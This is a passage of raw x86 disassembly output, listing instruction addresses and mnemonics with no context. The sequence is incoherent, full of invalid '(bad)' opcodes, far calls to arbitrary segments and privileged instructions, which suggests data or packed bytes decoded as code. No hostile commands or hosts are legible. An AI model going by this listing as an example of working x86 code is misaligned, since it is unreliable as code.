  419d0d:	aad    0x53
  419d0f:	outs   dx,DWORD PTR ds:[esi]
  419d10:	dec    edx
  419d11:	(bad)  [eax-0x5a2a2cd6]
  419d17:	in     al,dx
  419d18:	ret    
  419d19:	inc    edi
  419d1a:	ja     0x419d34
  419d1c:	pop    edi
  419d1d:	loope  0x419d00
  419d1f:	cmp    BYTE PTR [ebp-0x434c95df],ah
  419d25:	add    al,0xc3
  419d27:	adc    al,0x74
  419d29:	inc    ebx
  419d2a:	(bad)  
  419d2b:	xor    dh,BYTE PTR [ebp+0x77ccab9d]
  419d31:	ja     0x419cff
  419d33:	or     al,0x43
  419d35:	cmp    eax,0x7974a3b6
  419d3a:	call   0x93c4:0x8d5c5367
  419d41:	stos   BYTE PTR es:[edi],al
  419d42:	pop    ebx
  419d43:	repz leave 
  419d45:	xchg   bp,ax
  419d47:	ret    0x222f
  419d4a:	sti    
  419d4b:	jne    0x419d7d
  419d4d:	retf   0x656b
  419d50:	cli    
  419d51:	dec    ebp
  419d52:	aam    0x3b
  419d54:	add    BYTE PTR [edx],ah
  419d56:	loop   0x419d92
  419d58:	xchg   esi,eax
  419d59:	frstor [ebp+ebp*4+0x1d77c32b]
  419d60:	push   edx
  419d61:	ss or  eax,0x18673d28
  419d67:	jl     0x419d7c
  419d69:	sti    
  419d6a:	dec    esi
  419d6b:	mov    bh,0x86
  419d6d:	xchg   ebp,eax
  419d6e:	or     ecx,DWORD PTR [ebx+0x369ea79f]
  419d74:	mov    dl,0xc7
  419d76:	loopne 0x419d92
  419d78:	inc    ebx
  419d79:	pop    edi
  419d7a:	adc    DWORD PTR [ecx],eax
  419d7c:	dec    edx
  419d7d:	jns    0x419d1d
  419d7f:	imul   ebp,DWORD PTR [eax+0x28333cad],0xffffff80
  419d86:	mov    bh,0x39
  419d88:	xchg   esi,eax
  419d89:	outs   dx,DWORD PTR ds:[esi]
  419d8a:	and    eax,0xaf0ed63c
  419d8f:	xchg   edi,eax
  419d90:	jl     0x419df0
  419d92:	jmp    0x419d46
  419d94:	out    dx,eax
  419d95:	sub    eax,0x841ea302
  419d9a:	xchg   edi,eax
  419d9b:	pop    edx
  419d9c:	mov    dh,0xbb
  419d9e:	jns    0x419de7
  419da0:	int    0x39
  419da2:	sbb    al,BYTE PTR [ecx]
  419da4:	mov    dl,0x87
  419da6:	cmp    al,dh
  419da8:	mov    edx,0x3e1f36cb
  419dad:	jge    0x419d6c
  419daf:	push   esp
  419db0:	aad    0xe1
  419db2:	adc    al,0x3c
  419db4:	stc    
  419db5:	adc    al,0xf4
  419db7:	das    
  419db8:	push   cs
  419db9:	das    
  419dba:	pop    ebp
  419dbb:	into   
  419dbc:	jecxz  0x419d5b
  419dbe:	jno    0x419ddf
  419dc0:	stos   DWORD PTR es:[edi],eax
  419dc1:	jmp    FWORD PTR [esi+0x4c91a338]
  419dc7:	int    0xf1
  419dc9:	xor    al,0xd5
  419dcb:	add    BYTE PTR fs:[ebx+ecx*2-0x42],cl
  419dd0:	mov    eax,ds:0x34ab4e73
  419dd5:	(bad)  
  419dd6:	ja     0x419db0
  419dd8:	int    0x85
  419dda:	retf   0xf1cb
  419ddd:	jo     0x419d68
  419ddf:	jnp    0x419e4d
  419de1:	xor    cl,bh
  419de3:	jmp    0x419dee
  419de5:	leave  
  419de6:	xchg   esp,eax
  419de7:	dec    edi
  419de8:	(bad)  
  419de9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dea:	outs   dx,DWORD PTR ds:[esi]
  419deb:	loop   0x419dfc
  419ded:	pushf  
  419dee:	(bad)  
  419def:	ins    BYTE PTR es:[edi],dx
  419df0:	icebp  
  419df1:	pop    eax
  419df2:	mov    ah,0x1
  419df4:	sar    BYTE PTR [edi],0x26
  419df7:	mov    ch,0xb4
  419df9:	or     eax,0x912132ca
  419dfe:	or     al,0x36
  419e00:	add    al,0x7
  419e02:	xchg   esp,esi
  419e04:	jge    0x419db4
  419e06:	jne    0x419e76
  419e08:	ins    BYTE PTR es:[edi],dx
  419e09:	aad    0xb6
  419e0b:	xchg   ecx,eax
  419e0c:	mov    esi,ds
  419e0e:	mov    al,0x2
  419e10:	dec    ebp
  419e11:	js     0x419e21
  419e13:	imul   esp,DWORD PTR [edx+0x7e581c10],0x5c505342
  419e1d:	(bad)  
  419e1e:	jmp    0xfd30:0x9f6e3065
  419e25:	lds    ebx,FWORD PTR [esi]
  419e27:	retf   
  419e28:	mov    ds:0xacff906e,al
  419e2d:	jb     0x419dbd
  419e2f:	mov    ds:0xee5b7cff,eax
  419e34:	test   al,0xd8
  419e36:	mov    dh,0xc3
  419e39:	fstp   DWORD PTR [ebx+0x40078260]
  419e3f:	in     al,0xf9
  419e41:	icebp  
  419e42:	stos   BYTE PTR es:[edi],al
  419e43:	stos   DWORD PTR es:[edi],eax
  419e44:	icebp  
  419e45:	sbb    eax,0xa2dbd2
  419e4a:	div    BYTE PTR [edx-0x1e]
  419e4d:	dec    ebp
  419e4e:	xchg   ecx,eax
  419e4f:	mov    ah,BYTE PTR [edx-0x697596a7]
  419e55:	xlat   BYTE PTR ds:[ebx]
  419e56:	cmc    
  419e57:	int3   
  419e58:	mov    bh,0xa3
  419e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e5b:	pusha  
  419e5c:	fucomi st,st(2)
  419e5e:	jbe    0x419e30
  419e60:	dec    eax
  419e61:	outs   dx,DWORD PTR ds:[esi]
  419e62:	test   eax,0x2fd5e8a9
  419e67:	dec    ebx
  419e68:	(bad)  
  419e69:	lock mov edi,0xef152710
  419e6f:	mov    al,ds:0x3221d213
  419e74:	rol    BYTE PTR [eax],1
  419e76:	sbb    al,0x1e
  419e78:	xor    al,0xfc
  419e7a:	mov    DWORD PTR [edi],0xae13168
  419e80:	sub    BYTE PTR [edi],ch
  419e82:	je     0x419e71
  419e84:	ds rol eax,0xb4
  419e88:	call   0x5bad0a4f
  419e8d:	sar    DWORD PTR [ebx-0x63],1
  419e90:	pop    esp
  419e91:	pop    edx
  419e92:	cmp    bh,BYTE PTR [esp+esi*2]
  419e95:	sbb    BYTE PTR [ecx+0x3d],ch
  419e98:	adc    bl,dh
  419e9a:	inc    esp
  419e9b:	icebp  
  419e9c:	pushf  
  419e9d:	sar    DWORD PTR [ecx-0x39d9a9d1],cl
  419ea3:	arpl   WORD PTR [esi+0x6],bp
  419ea6:	lds    ecx,FWORD PTR [ecx]
  419ea8:	nop
  419ea9:	fisttp DWORD PTR [ebp-0x12]
  419eac:	idiv   BYTE PTR [ebx+0x3d]
  419eaf:	or     DWORD PTR [esi-0x11ac50c2],ebx
  419eb5:	adc    al,0x1a
  419eb7:	(bad)  
  419eb8:	jbe    0x419e72
  419eba:	xchg   ebx,eax
  419ebb:	sub    DWORD PTR [bp+di],edi
  419ebe:	sbb    eax,0xfb4607c1
  419ec3:	mov    ah,BYTE PTR [eax+edx*8]
  419ec6:	sbb    al,0xa5
  419ec8:	mov    ds:0x8474b490,eax
  419ecd:	mov    ecx,0x38dce091
  419ed2:	mov    dh,0x14
  419ed4:	das    
  419ed5:	xchg   BYTE PTR [edx+eiz*8+0x37],dl
  419ed9:	pushf  
  419eda:	scas   al,BYTE PTR es:[edi]
  419edb:	sub    eax,DWORD PTR [eax-0x4f2e6e3c]
  419ee1:	imul   edx,DWORD PTR ds:[esi],0xffffff88
  419ee5:	lds    edx,FWORD PTR [esi+0x1a]
  419ee8:	push   0xffffffb9
  419eea:	adc    DWORD PTR [esi+0x36e1c2c3],ebx
  419ef0:	jne    0x419e7f
  419ef2:	pop    ss
  419ef3:	push   edi
  419ef4:	stos   DWORD PTR es:[edi],eax
  419ef5:	fadd   st(4),st
  419ef7:	push   esp
  419ef8:	xchg   ebp,eax
  419ef9:	daa    
  419efa:	fs jge 0x419f00
  419efd:	sub    eax,0x50b1bdea
  419f02:	data16 or al,0x1e
  419f05:	pusha  
  419f06:	push   cs
  419f07:	jge    0x419f79
  419f09:	mov    ecx,0xd9772543
  419f0e:	jo     0x419f2d
  419f10:	mov    dl,0xef
  419f12:	ror    BYTE PTR [edi+esi*4-0x4c],0x98
  419f17:	xchg   esi,eax
  419f18:	sub    BYTE PTR [ebx+ecx*8+0x53],bh
  419f1c:	sahf   
  419f1d:	leave  
  419f1e:	cdq    
  419f1f:	jnp    0x419f74
  419f21:	shl    edi,1
  419f23:	popa   
  419f24:	ror    dl,cl
  419f26:	addr16 sub al,0xd9
  419f29:	add    dh,BYTE PTR [eax-0xb52b651]
  419f2f:	adc    eax,edi
  419f31:	mov    cl,0xd3
  419f33:	mov    WORD PTR [edi+0x26],?
  419f36:	mov    ecx,0x1c3c6ea8
  419f3b:	retf   
  419f3c:	jl     0x419f8e
  419f3e:	inc    ebp
  419f3f:	xchg   edx,eax
  419f40:	xchg   edx,eax
  419f41:	dec    ebp
  419f42:	scas   al,BYTE PTR es:[edi]
  419f43:	repz into 
  419f45:	push   0x37
  419f47:	(bad)  
  419f49:	pop    ecx
  419f4a:	sub    al,0x27
  419f4c:	adc    ebx,DWORD PTR [ecx-0x6b78b0f1]
  419f52:	mov    eax,ds:0x8f0f3960
  419f57:	cmp    eax,0x30911953
  419f5c:	shl    ebx,1
  419f5e:	dec    esi
  419f5f:	xchg   ecx,eax
  419f60:	sub    eax,esp
  419f62:	mov    al,0xa6
  419f64:	test   bl,ch
  419f66:	xchg   edi,eax
  419f67:	sbb    ecx,ecx
  419f69:	stos   BYTE PTR es:[edi],al
  419f6a:	cmp    eax,0x3336f6d0
  419f6f:	cmp    al,0x30
  419f71:	pop    es
  419f72:	mov    ch,BYTE PTR [esi]
  419f74:	pop    eax
  419f75:	pop    ecx
  419f76:	mov    ebx,0x5ff6a817
  419f7b:	aad    0x28
  419f7d:	lods   al,BYTE PTR ds:[esi]
  419f7e:	pop    es
  419f7f:	sbb    ebp,DWORD PTR [edi+0x57]
  419f82:	sub    eax,0x4ddc232b
  419f87:	sbb    al,0x60
  419f89:	adc    ah,BYTE PTR [eax]
  419f8b:	aad    0xe
  419f8d:	sti    
  419f8e:	push   eax
  419f8f:	or     eax,0xff996a8
  419f94:	(bad)  
  419f95:	es sahf 
  419f97:	xchg   ebx,eax
  419f98:	dec    esp
  419f99:	dec    ebp
  419f9a:	mov    ebx,edi
  419f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f9d:	inc    eax
  419f9e:	minps  xmm1,XMMWORD PTR [ebx+0x23]
  419fa2:	(bad)  
  419fa3:	ins    DWORD PTR es:[edi],dx
  419fa4:	cld    
  419fa5:	cmc    
  419fa6:	push   esi
  419fa7:	into   
  419fa8:	mov    ch,BYTE PTR [edx-0xa]
  419fab:	push   esi
  419fac:	(bad)  
  419fae:	div    edi
  419fb0:	mov    bh,0x45
  419fb2:	pop    ss
  419fb3:	hlt    
  419fb4:	test   eax,0x7e466f43
  419fb9:	add    BYTE PTR [edi-0x52d653e2],cl
  419fbf:	add    eax,0xe6f05683
  419fc4:	imul   ecx,DWORD PTR [ebp+eax*4-0x4c7e5f00],0x7d1927d7
  419fcf:	jp     0x419f59
  419fd1:	add    BYTE PTR [ebx-0x6a],al
  419fd4:	es (bad) 
  419fd6:	lods   eax,DWORD PTR ds:[esi]
  419fd7:	mov    di,0x455
  419fdb:	int3   
  419fdc:	inc    edx
  419fdd:	add    DWORD PTR [edi],0xffffff92
  419fe0:	pop    ebx
  419fe1:	pop    ds
  419fe2:	call   0x93047161
  419fe7:	xor    edx,DWORD PTR [eax+0xc]
  419fea:	test   BYTE PTR [edi-0x3006b528],bl
  419ff0:	sub    DWORD PTR [esi+esi*8],edi
  419ff3:	push   ebx
  419ff4:	sbb    cl,BYTE PTR [eax]
  419ff6:	mov    esi,ecx
  419ff8:	xor    DWORD PTR [edi],esp
  419ffa:	pop    eax
  419ffb:	mov    cl,0x48
  419ffd:	fidiv  WORD PTR [edi]
  419fff:	cld    
  41a000:	jae    0x419fdf
  41a002:	popf   
  41a003:	repnz out 0x8b,al
  41a006:	mov    ebp,DWORD PTR [edi-0x5f]
  41a009:	data16 jecxz 0x419f98
  41a00c:	add    bl,BYTE PTR [ebp+0x58f146e0]
  41a012:	sbb    ch,BYTE PTR [edx]
  41a014:	xor    al,0x50
  41a016:	mov    BYTE PTR [esi],ah
  41a018:	push   ebp
  41a019:	cmp    eax,0x992bfc7d
  41a01e:	retf   
  41a01f:	pop    esi
  41a020:	addr16 and eax,0xee12f6d4
  41a026:	ss sbb esp,edi
  41a029:	or     bh,BYTE PTR ds:0x64749f06
  41a02f:	add    DWORD PTR [edx],0xe5e6a6a1
  41a035:	lds    esp,FWORD PTR [ecx+0x30]
  41a038:	cwde   
  41a039:	cld    
  41a03a:	mov    dl,0x87
  41a03c:	dec    ebp
  41a03d:	mov    ch,0x8d
  41a03f:	xchg   ecx,eax
  41a040:	jle    0x41a071
  41a042:	jecxz  0x41a0ae
  41a044:	(bad)
  41a049:	fidiv  DWORD PTR [eax+0x58e1a432]
  41a04f:	rol    DWORD PTR [ebx+0x68042a05],cl
  41a055:	sub    al,0x1c
  41a057:	push   0xfffffffc
  41a059:	ret    0xdde1
  41a05c:	sbb    eax,0x285e5928
  41a061:	xor    BYTE PTR [eax-0x5828e973],dh
  41a067:	test   DWORD PTR [ecx+0xb522b5a],0x2843ac05
  41a071:	jae    0x41a022
  41a073:	leave  
  41a074:	push   ss
  41a075:	nop
  41a076:	cs pop esp
  41a078:	fs push ss
  41a07a:	or     DWORD PTR [esp+ecx*8],0xda903d0a
  41a081:	out    dx,eax
  41a082:	test   al,0xe9
  41a084:	leave  
  41a085:	lock sbb al,0xab
  41a088:	sub    BYTE PTR [edx],ah
  41a08a:	push   eax
  41a08b:	clc    
  41a08c:	cli    
  41a08d:	test   al,0x8a
  41a08f:	ud2    
  41a091:	shl    edx,cl
  41a093:	pop    ebp
  41a094:	inc    ecx
  41a095:	ins    DWORD PTR es:[edi],dx
  41a096:	fmul   st(6),st
  41a098:	push   ds
  41a099:	xor    BYTE PTR [edi*4-0x60ad4def],al
  41a0a0:	int    0x69
  41a0a2:	sub    eax,DWORD PTR [esi+0xaf16c17]
  41a0a8:	popa   
  41a0a9:	inc    eax
  41a0aa:	push   eax
  41a0ab:	xor    BYTE PTR [edi+ecx*1+0x33],al
  41a0af:	repnz add al,0x94
  41a0b2:	push   ds
  41a0b3:	pop    esp
  41a0b4:	mov    gs,WORD PTR [edi]
  41a0b6:	mov    edi,edx
  41a0b8:	or     eax,0xa4fe0964
  41a0bd:	sbb    al,ch
  41a0bf:	xchg   ebx,eax
  41a0c0:	sub    cl,bl
  41a0c2:	pop    ecx
  41a0c3:	(bad)  
  41a0c4:	xor    eax,DWORD PTR [edi]
  41a0c6:	mov    bh,cl
  41a0c8:	test   al,0xf3
  41a0ca:	fistp  WORD PTR [eax+0x2c428617]
  41a0d0:	popa   
  41a0d1:	sbb    al,0xb7
  41a0d3:	loope  0x41a083
  41a0d5:	mov    bh,0xe4
  41a0d7:	popf   
  41a0d8:	mov    ch,0x2e
  41a0da:	fstp   QWORD PTR [eax]
  41a0dc:	sub    al,0x52
  41a0de:	xchg   ecx,eax
  41a0df:	sbb    dh,bl
  41a0e1:	or     BYTE PTR [edx],0xbc
  41a0e4:	nop
  41a0e5:	push   esp
  41a0e6:	xor    al,0xb6
  41a0e8:	and    edx,ebx
  41a0ea:	mov    esi,0x771466f7
  41a0ef:	in     eax,0xf6
  41a0f1:	xchg   ecx,eax
  41a0f2:	out    0xb7,eax
  41a0f4:	pop    esp
  41a0f5:	mul    BYTE PTR [edi-0x42d9bbc2]
  41a0fb:	sub    BYTE PTR [esi+ecx*4+0x44],dl
  41a0ff:	(bad)  
  41a100:	aam    0xb1
  41a102:	xchg   ecx,eax
  41a103:	jmp    0x41a08c
  41a105:	cld    
  41a106:	outs   dx,BYTE PTR ds:[esi]
  41a107:	sbb    DWORD PTR fs:[eax+0x4a],eax
  41a10b:	mov    ds:0x94097cd5,al
  41a110:	cld    
  41a111:	jns    0x41a137
  41a113:	mov    bl,0xff
  41a115:	cwde   
  41a116:	cmp    eax,DWORD PTR [ebx+ebp*1+0x34]
  41a11a:	in     al,dx
  41a11b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a11c:	dec    ebx
  41a11d:	push   ss
  41a11e:	sbb    eax,0xa890cac8
  41a123:	int    0xc4
  41a125:	in     al,dx
  41a126:	inc    ebx
  41a127:	call   0xcaee:0x325a6993
  41a12e:	rcl    DWORD PTR [eax],0xc3
  41a131:	in     al,dx
  41a132:	cmc    
  41a133:	pop    edi
  41a134:	mov    bh,0x9a
  41a136:	in     al,dx
  41a137:	sub    ah,0x5c
  41a13a:	cs inc esi
  41a13c:	adc    dh,BYTE PTR [eax+0x7e]
  41a13f:	hlt    
  41a140:	sbb    ecx,DWORD PTR [esi+0x26d3de23]
  41a146:	ja     0x41a198
  41a148:	rcl    DWORD PTR [ecx+0x189899e5],cl
  41a14e:	mov    edi,0xac62c273
  41a153:	(bad)  
  41a154:	neg    DWORD PTR [esi]
  41a156:	ror    DWORD PTR [ebx],1
  41a158:	push   edx
  41a159:	jl     0x41a10a
  41a15b:	mov    al,0xe1
  41a15d:	add    BYTE PTR [esi+edx*8+0x66],0x1
  41a162:	(bad)  
  41a163:	repz out dx,eax
  41a165:	mov    ebx,DWORD PTR [edi+0x1acd6c2b]
  41a16b:	enter  0xaf2f,0xbf
  41a16f:	cmp    al,0x7
  41a171:	das    
  41a172:	cmp    eax,ebp
  41a174:	dec    eax
  41a175:	fs xchg ecx,eax
  41a177:	fstp   st(4)
  41a179:	inc    edi
  41a17a:	push   esi
  41a17b:	lahf   
  41a17c:	xor    esi,ecx
  41a17e:	rcl    DWORD PTR [edi+0x2d],1
  41a181:	outs   dx,DWORD PTR ds:[esi]
  41a182:	dec    edx
  41a183:	jge    0x41a159
  41a185:	les    ebx,FWORD PTR [eax-0x51bf7bd]
  41a18b:	es jmp 0xcdb5:0x3d5b5e82
  41a193:	arpl   WORD PTR [eax-0x7f],bp
  41a196:	fs xchg esi,eax
  41a198:	lods   eax,DWORD PTR ds:[esi]
  41a199:	inc    edx
  41a19a:	test   BYTE PTR [ebx+0x6c241ca4],0x6
  41a1a1:	xchg   edx,eax
  41a1a2:	mov    gs,WORD PTR [ecx+ebp*4-0x58]
  41a1a6:	mov    ebx,0xfa51670f
  41a1ab:	arpl   WORD PTR [ebx],ax
  41a1ad:	mov    bh,0x36
  41a1af:	ins    BYTE PTR es:[edi],dx
  41a1b0:	jo     0x41a1cd
  41a1b2:	cli    
  41a1b3:	cwde   
  41a1b4:	fdiv   DWORD PTR [edi]
  41a1b6:	or     bh,BYTE PTR ds:0xc289e110
  41a1bc:	cmc    
  41a1bd:	ins    BYTE PTR es:[edi],dx
  41a1be:	xor    DWORD PTR [edx],esp
  41a1c0:	clc    
  41a1c1:	mov    BYTE PTR [ecx+0x3e12c37b],0x7e
  41a1c8:	mov    eax,ds:0x592e4729
  41a1cd:	jle    0x41a165
  41a1cf:	inc    edi
  41a1d0:	inc    BYTE PTR [edx-0x17]
  41a1d3:	mov    ah,BYTE PTR [edx]
  41a1d5:	and    BYTE PTR [ebx-0x7e],al
  41a1d8:	push   edx
  41a1d9:	sub    cl,bh
  41a1db:	enter  0xb5dd,0x41
  41a1df:	dec    edx
  41a1e0:	jle    0x41a1f4
  41a1e2:	mov    ch,0x4
  41a1e4:	shl    DWORD PTR [esi+0xf],cl
  41a1e7:	bound  esp,QWORD PTR [ecx-0x2b]
  41a1ea:	xlat   BYTE PTR ds:[ebx]
  41a1eb:	sbb    esp,ecx
  41a1ed:	scas   eax,DWORD PTR es:[edi]
  41a1ee:	xor    al,0x12
  41a1f0:	push   ss
  41a1f1:	xor    esi,DWORD PTR [ecx]
  41a1f3:	adc    eax,DWORD PTR [ecx+0x35]
  41a1f6:	data16 and ah,BYTE PTR [edx+0x4]
  41a1fa:	dec    edx
  41a1fb:	cmp    BYTE PTR ds:0xf972cd08,cl
  41a201:	push   ebp
  41a202:	fbstp  TBYTE PTR [edi+0x3202a71e]
  41a208:	xchg   edx,eax
  41a209:	jne    0x41a1f7
  41a20b:	mov    WORD PTR [edx],fs
  41a20d:	push   ebx
  41a20e:	jp     0x41a1e2
  41a210:	mov    al,0x92
  41a212:	inc    ecx
  41a213:	cmp    cl,BYTE PTR [ebx-0xeaefed8]
  41a219:	pop    ebx
  41a21a:	enter  0xc4ad,0x37
  41a21e:	call   0xde1b:0x3f9a2a1b
  41a225:	inc    eax
  41a226:	stos   DWORD PTR es:[edi],eax
  41a227:	in     al,0x6e
  41a229:	loop   0x41a207
  41a22b:	loope  0x41a1f9
  41a22d:	jno    0x41a213
  41a22f:	je     0x41a26f
  41a231:	mov    eax,ds:0x85b01d7b
  41a236:	les    edx,FWORD PTR [eax-0x4b]
  41a239:	xchg   BYTE PTR [ecx-0x53],al
  41a23c:	dec    eax
  41a23e:	call   0xd54f:0x8c9c7341
  41a245:	adc    BYTE PTR [ebx+0xd],dh
  41a248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a249:	ins    DWORD PTR es:[edi],dx
  41a24a:	cmp    cl,bl
  41a24c:	lods   al,BYTE PTR ds:[esi]
  41a24d:	mov    bh,BYTE PTR ds:0x392dddef
  41a253:	loope  0x41a227
  41a255:	lods   eax,DWORD PTR ds:[esi]
  41a256:	mov    ds:0x41cfeb75,eax
  41a25b:	ret    
  41a25c:	pop    esi
  41a25d:	ret    
  41a25e:	add    al,0x85
  41a260:	xor    al,0xae
  41a262:	fsubr  DWORD PTR [edi+eax*8]
  41a265:	or     al,0x38
  41a267:	pusha  
  41a268:	push   esi
  41a269:	lds    edi,FWORD PTR [eax-0x6]
  41a26c:	push   ds
  41a26d:	and    al,0x8e
  41a26f:	jl     0x41a2b1
  41a271:	rol    BYTE PTR [esi],1
  41a273:	xlat   BYTE PTR ds:[ebx]
  41a274:	pop    esp
  41a275:	outs   dx,BYTE PTR ds:[esi]
  41a276:	or     ah,BYTE PTR [edi+0xd99c2cc]
  41a27c:	pusha  
  41a27d:	pop    eax
  41a27e:	pop    edi
  41a27f:	jns    0x41a2e7
  41a281:	mov    BYTE PTR [esi],dh
  41a283:	mov    ds,WORD PTR [edi+0x10]
  41a286:	xor    eax,ecx
  41a288:	pop    ecx
  41a289:	(bad)  
  41a28a:	xchg   ebx,eax
  41a28b:	cld    
  41a28c:	ds retf 0xd601
  41a290:	pop    esi
  41a291:	xor    cl,BYTE PTR [edx+0x792316f]
  41a297:	mov    ecx,0xc218ad5e
  41a29c:	in     al,dx
  41a29d:	jo     0x41a30e
  41a29f:	shr    BYTE PTR [eax],0x87
  41a2a2:	fnsave [esi+edx*2+0x55dd2944]
  41a2a9:	(bad)  
  41a2aa:	mov    eax,0x6670ea7f
  41a2af:	pop    edi
  41a2b0:	ss pop esp
  41a2b2:	(bad)  
  41a2b3:	pusha  
  41a2b4:	pop    esp
  41a2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2b6:	and    DWORD PTR [esi+0x43283a5b],ebx
  41a2bc:	push   0xffffff8b
  41a2be:	fwait
  41a2bf:	jae    0x41a259
  41a2c1:	inc    esi
  41a2c2:	in     al,dx
  41a2c3:	in     eax,dx
  41a2c4:	call   0xfcfe:0xd96c3f6b
  41a2cb:	jl     0x41a2a5
  41a2cd:	mov    ds:0x83ccc4dd,eax
  41a2d2:	sub    bh,al
  41a2d4:	mov    ebx,0x9ca1d36d
  41a2d9:	inc    ecx
  41a2da:	in     al,0x9f
  41a2dc:	jmp    0x90f00f54
  41a2e1:	mov    ds:0xa4bb79c,al
  41a2e6:	pushf  
  41a2e7:	imul   eax,esp,0x30074f27
  41a2ed:	or     edx,DWORD PTR [ebx]
  41a2ef:	and    al,0xd6
  41a2f1:	stos   BYTE PTR es:[edi],al
  41a2f2:	mov    ch,0x42
  41a2f4:	dec    ecx
  41a2f5:	and    ecx,DWORD PTR [eax-0x30]
  41a2f8:	call   0x68df53a2
  41a2fd:	mov    eax,DWORD PTR [edi]
  41a2ff:	jbe    0x41a293
  41a301:	jl     0x41a306
  41a303:	push   ebx
  41a304:	cwde   
  41a305:	out    dx,eax
  41a306:	shl    bl,cl
  41a308:	std    
  41a309:	(bad)  
  41a30a:	push   ebp
  41a30b:	inc    ebp
  41a30c:	jg     0x41a2f9
  41a30e:	gs int 0xd2
  41a311:	cmp    ch,BYTE PTR [ecx+0x290b91f6]
  41a317:	rcr    DWORD PTR [edi+ebp*1-0x1b],0xfd
  41a31c:	inc    edx
  41a31d:	cmp    ah,dh
  41a31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a320:	inc    esp
  41a321:	ret    
  41a322:	mov    ah,ch
  41a324:	enter  0x3ca4,0xd8
  41a328:	dec    ecx
  41a329:	aam    0x77
  41a32b:	jmp    0x9660b0d6
  41a330:	pusha  
  41a331:	rol    DWORD PTR [ecx],0x30
  41a334:	rcr    DWORD PTR ds:0x49c965cd,0x95
  41a33b:	sbb    BYTE PTR [edi],dh
  41a33d:	pop    ecx
  41a33e:	popf   
  41a33f:	mov    edi,0x53611a25
  41a344:	and    ebx,edx
  41a346:	lods   al,BYTE PTR ds:[esi]
  41a347:	mov    eax,DWORD PTR [edi]
  41a349:	cs sbb DWORD PTR ss:[ecx],edi
  41a34d:	xchg   esp,eax
  41a34e:	jne    0x41a320
  41a350:	push   es
  41a351:	popf   
  41a352:	imul   eax,DWORD PTR [ebx+edi*1+0x20266455],0x2b
  41a35a:	inc    esi
  41a35b:	(bad)  
  41a35d:	sbb    DWORD PTR [edi-0x5bd0e387],ecx
  41a363:	mov    cs,WORD PTR [esi*1+0x4ea33b91]
  41a36a:	add    ch,cl
  41a36c:	cmp    BYTE PTR [edi],al
  41a36e:	pusha  
  41a36f:	push   ecx
  41a370:	add    eax,0x5256e9b6
  41a375:	sbb    al,0x55
  41a377:	bound  ebp,QWORD PTR [ecx-0x3d]
  41a37a:	pop    es
  41a37b:	pop    ebx
  41a37c:	lods   al,BYTE PTR ds:[esi]
  41a37d:	cmc    
  41a37e:	mov    ds:0xf4351fd0,al
  41a383:	ds push eax
  41a385:	or     dl,BYTE PTR [eax+0x1e73a3f0]
  41a38b:	leave  
  41a38c:	shl    ah,0xc
  41a38f:	jle    0x41a362
  41a391:	jp     0x41a3a6
  41a393:	jne    0x41a40c
  41a395:	test   eax,esi
  41a397:	and    ebx,edx
  41a399:	daa    
  41a39a:	call   0x5d20889c
  41a39f:	add    bh,BYTE PTR [ecx+0x64]
  41a3a2:	in     al,dx
  41a3a3:	shr    DWORD PTR [edx-0x2f7a0fd2],0x99
  41a3aa:	inc    edx
  41a3ab:	adc    esp,DWORD PTR [esi+eiz*1+0x71]
  41a3af:	into   
  41a3b0:	or     DWORD PTR [esi+0x3840be27],0x2
  41a3b7:	jne    0x41a375
  41a3b9:	xchg   esp,esi
  41a3bb:	push   edi
  41a3bc:	push   ebx
  41a3bd:	or     esp,eax
  41a3bf:	jge    0x41a419
  41a3c1:	mov    esi,0xa54ad96b
  41a3c6:	mov    ah,0x81
  41a3c8:	xor    al,0x74
  41a3ca:	mov    dh,0x85
  41a3cc:	not    esp
  41a3ce:	fadd   DWORD PTR [ecx+0xae2cc86]
  41a3d4:	rol    DWORD PTR [eax-0x2c270b37],cl
  41a3da:	mov    ds,WORD PTR [ecx+0x3f44f279]
  41a3e0:	mov    ss,WORD PTR [edi+0x39]
  41a3e3:	inc    eax
  41a3e4:	push   es
  41a3e5:	or     ebx,edi
  41a3e7:	push   ds
  41a3e8:	xor    ch,al
  41a3ea:	nop
  41a3eb:	ja     0x41a374
  41a3ed:	into   
  41a3ee:	xchg   edx,edi
  41a3f0:	pop    ebx
  41a3f1:	adc    dl,ah
  41a3f3:	cmc    
  41a3f4:	sbb    al,0xf5
  41a3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3f7:	mov    ds,esi
  41a3f9:	mov    edi,0x7f44c91d
  41a3fe:	(bad)  
  41a3ff:	in     eax,0xa1
  41a401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a402:	sub    al,0x7b
  41a404:	mov    esp,0x6bc07427
  41a409:	jmp    0x41a442
  41a40b:	adc    al,0x77
  41a40d:	inc    ebp
  41a40e:	dec    edi
  41a40f:	mov    ch,0x18
  41a411:	dec    eax
  41a412:	jo     0x41a3a8
  41a414:	jbe    0x41a464
  41a416:	inc    ecx
  41a417:	ret    0x41de
  41a41a:	mov    BYTE PTR [ebp+0x54],al
  41a41d:	icebp  
  41a41e:	mov    al,0x33
  41a420:	sub    DWORD PTR [edx],ebx
  41a422:	mov    cl,0x62
  41a424:	bound  edi,QWORD PTR [ebp+0x3]
  41a427:	arpl   ax,bp
  41a429:	popf   
  41a42a:	aad    0x1
  41a42c:	mov    cl,0xa8
  41a42e:	popa   
  41a42f:	(bad)  
  41a430:	jl     0x41a431
  41a432:	shl    BYTE PTR [esi+0x198c9e94],cl
  41a438:	jnp    0x41a3cd
  41a43a:	add    bl,BYTE PTR [esi]
  41a43c:	lock ret 0x4077
  41a440:	pop    es
  41a441:	or     al,0x6f
  41a443:	loopne 0x41a40a
  41a445:	out    dx,eax
  41a446:	outs   dx,BYTE PTR ds:[esi]
  41a447:	and    ecx,eax
  41a449:	xchg   esp,eax
  41a44a:	inc    esp
  41a44b:	xchg   ebx,eax
  41a44c:	push   esi
  41a44d:	adc    ecx,0x80b107e7
  41a453:	gs xchg esp,eax
  41a455:	add    edx,DWORD PTR [edx+0x9]
  41a458:	ret    0x2f29
  41a45b:	pop    ecx
  41a45c:	(bad)  
  41a45d:	push   0xffffffb7
  41a45f:	xchg   ebp,eax
